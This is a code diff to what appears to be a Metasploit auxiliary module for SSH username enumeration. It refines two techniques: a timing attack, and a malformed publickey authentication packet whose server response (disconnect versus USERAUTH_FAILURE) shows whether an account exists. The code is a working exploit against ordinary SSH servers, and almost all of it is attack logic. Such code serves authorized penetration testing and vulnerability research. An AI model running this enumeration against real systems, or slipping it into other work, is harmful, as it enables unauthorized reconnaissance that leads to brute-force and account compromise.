@@ -136,22 +136,25 @@ class MetasploitModule < Msf::Auxiliary
     start_time = Time.new
 
     begin
-      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
+      ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do
         Net::SSH.start(ip, user, opts)
       end
     rescue Rex::ConnectionError
       return :connection_error
-    # Deja vu...
-    rescue Net::SSH::Disconnect, ::EOFError
-      return :success
-    rescue ::Timeout::Error
+    rescue Timeout::Error
       return :success if technique == :timing_attack
-    rescue Net::SSH::Exception
+    rescue Net::SSH::AuthenticationFailed
+      return :fail if technique == :malformed_packet
+    rescue Net::SSH::Exception => e
+      vprint_error("#{e.class}: #{e.message}")
     end
 
     finish_time = Time.new
 
-    if technique == :timing_attack
+    case technique
+    when :malformed_packet
+      return :success if ssh
+    when :timing_attack
       return :success if (finish_time - start_time > threshold)
     end
 
@@ -198,8 +201,6 @@ class MetasploitModule < Msf::Auxiliary
       users << datastore['USERNAME']
     elsif datastore['USER_FILE'] && File.readable?(datastore['USER_FILE'])
       users += File.read(datastore['USER_FILE']).split
-    else
-      raise ArgumentError, "Cannot read file #{datastore['USER_FILE']}"
     end
 
     users
@@ -245,8 +246,15 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
 
+    users = user_list
+
+    if users.empty?
+      print_error('Please populate USERNAME or USER_FILE')
+      return
+    end
+
     print_status("#{peer(ip)} Starting scan")
-    user_list.each { |user| show_result(attempt_user(user, ip), user, ip) }
+    users.each { |user| show_result(attempt_user(user, ip), user, ip) }
   end
 end
 
@@ -274,7 +282,20 @@ class Net::SSH::Authentication::Methods::MalformedPacket < Net::SSH::Authenticat
       'publickey'
     ))
 
-    # Throwaway read?
-    session.next_message
+    # SSH_MSG_DISCONNECT is queued
+    begin
+      message = session.next_message
+    rescue Net::SSH::Disconnect
+      debug { 'Received SSH_MSG_DISCONNECT' }
+      return true
+    end
+
+    if message && message.type == USERAUTH_FAILURE
+      debug { 'Received SSH_MSG_USERAUTH_FAILURE' }
+      return false
+    end
+
+    # We'll probably never hit this
+    false
   end
 end
